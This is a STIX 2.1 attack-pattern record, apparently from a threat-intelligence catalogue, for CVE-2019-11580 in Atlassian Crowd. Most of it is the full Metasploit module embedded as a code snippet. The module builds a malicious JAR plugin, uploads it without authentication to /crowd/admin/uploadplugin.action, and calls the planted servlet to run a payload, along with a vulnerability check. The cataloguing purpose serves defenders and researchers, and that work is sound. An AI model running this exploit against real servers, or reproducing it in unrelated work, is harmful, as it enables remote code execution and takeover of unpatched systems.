{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9f6c308d-dec7-435c-87ac-ba4f4105dda5",
    "created": "2024-08-14T17:08:40.956907Z",
    "modified": "2024-08-14T17:08:40.956911Z",
    "name": "Atlassian Crowd pdkinstall Unauthenticated Plugin Upload RCE",
    "description": " This module can be used to upload a plugin on Atlassian Cloud via the pdkinstall development plugin as an unauthenticated attacker. The payload is uploaded as a JAR archive containing a servlet using a POST request to /crowd/admin/uploadplugin.action. The check command will check that the /crowd/admin/uploadplugin.action page exists and that it responds appropriately to determine if the target is vulnerable or not. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/atlassian_crowd_pdkinstall_plugin_upload_rce.rb",
            "external_id": "atlassian_crowd_pdkinstall_plugin_upload_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-11580"
        },
        {
            "source_name": "reference",
            "url": "https://jira.atlassian.com/browse/CWD-5388"
        },
        {
            "source_name": "reference",
            "url": "https://confluence.atlassian.com/crowd/crowd-security-advisory-2019-05-22-970260700.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.corben.io/atlassian-crowd-rce/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Atlassian Crowd pdkinstall Unauthenticated Plugin Upload RCE',\n        'Description' => %q{\n          This module can be used to upload a plugin on Atlassian Cloud via\n          the pdkinstall development plugin as an unauthenticated attacker.\n          The payload is uploaded as a JAR archive containing a servlet using\n          a POST request to /crowd/admin/uploadplugin.action. The check command will\n          check that the /crowd/admin/uploadplugin.action page exists and that it\n          responds appropriately to determine if the target is vulnerable or not.\n        },\n        'Author' => [\n          'Paul', # Vulnerability discovery\n          'Corben Leo', # PoC and Vulnerability Writeup. @hacker_ on Twitter.\n          'Grant Willcox' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2019-11580'],\n          ['URL', 'https://jira.atlassian.com/browse/CWD-5388'],\n          ['URL', 'https://confluence.atlassian.com/crowd/crowd-security-advisory-2019-05-22-970260700.html'],\n          ['URL', 'https://www.corben.io/atlassian-crowd-rce/']\n        ],\n        'Platform' => %w[java],\n        'Arch' => ARCH_JAVA,\n        'DefaultOptions' => {\n          'HttpClientTimeout' => 25 # Allow a bit more time for the file upload to complete, just in case things are delayed, before timing out.\n        },\n        'Notes' => {\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ]\n        },\n        'Targets' => [\n          [\n            'Java Universal',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'java'\n            }\n          ]\n        ],\n        'DisclosureDate' => '2019-05-22'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8095),\n        OptString.new('TARGETURI', [true, 'The base URI to Atlassian Crowd', '/crowd/']),\n\n      ]\n    )\n  end\n\n  def upload_plugin(content)\n    data = Rex::MIME::Message.new\n    data.add_part(content, nil, 'binary', \"form-data; name=\\\"file_#{Rex::Text.rand_text_alpha(8..12)}\\\"; filename=\\\"#{Rex::Text.rand_text_alpha(8..12)}.jar\\\"\")\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/admin/uploadplugin.action'),\n      'method' => 'POST',\n      'data' => data.to_s,\n      'ctype' => \"multipart/mixed; boundary=#{data.bound}\"\n    }, datastore['HttpClientTimeout'])\n  end\n\n  def generate_plugin_jar\n    name = Rex::Text.rand_text_alpha(8..12)\n    servlet_name = Rex::Text.rand_text_alpha(8..12)\n    atlassian_plugin_xml = %(\n        <atlassian-plugin key=\"metasploit.PayloadServlet\" name=\"#{name}\" plugins-version=\"2\" class=\"metasploit.PayloadServlet\">\n          <plugin-info>\n            <param name=\"atlassian-data-center-compatible\">true</param>\n            <description></description>\n            <version>1.0.0</version>\n          </plugin-info>\n\n          <servlet name=\"#{servlet_name}\" key=\"#{servlet_name}\" class=\"metasploit.PayloadServlet\">\n            <url-pattern>/#{name}</url-pattern>\n            <description>#{Faker::App.name}</description>\n          </servlet>\n        </atlassian-plugin>\n      )\n\n    # Generates .jar file for upload\n    zip = payload.encoded_jar\n    zip.add_file('atlassian-plugin.xml', atlassian_plugin_xml)\n\n    servlet = MetasploitPayloads.read('java', 'metasploit', 'PayloadServlet.class')\n    zip.add_file('/metasploit/PayloadServlet.class', servlet)\n\n    contents = zip.pack\n    [contents, name]\n  end\n\n  def check\n    print_status('Sending a test request to try installing an invalid plugin to see if the server is vulnerable...')\n    res = upload_plugin(Rex::Text.rand_text_alpha(45..120))\n    if res.nil?\n      CheckCode::Unknown('Was not able to connect to the target!')\n    elsif (res.body =~ /Unable to install plugin/) && (res.code == 400)\n      CheckCode::Vulnerable(\"Target responded that it couldn't install an invalid plugin, indicating it's vulnerable!\")\n    else\n      CheckCode::Safe(\"Target didn't respond that it couldn't install an invalid plugin, so it's not vulnerable!\")\n    end\n  end\n\n  def exploit\n    print_status('Generating a malicious JAR plugin...')\n    content, plugin_name = generate_plugin_jar\n    print_status('Uploading the malicious JAR plugin...')\n    upload_plugin(content)\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, \"/plugins/servlet/#{plugin_name}\"),\n      'method' => 'GET'\n    }, datastore['HttpClientTimeout'])\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-05-22",
    "x_mitre_platforms": [
        "java"
    ]
}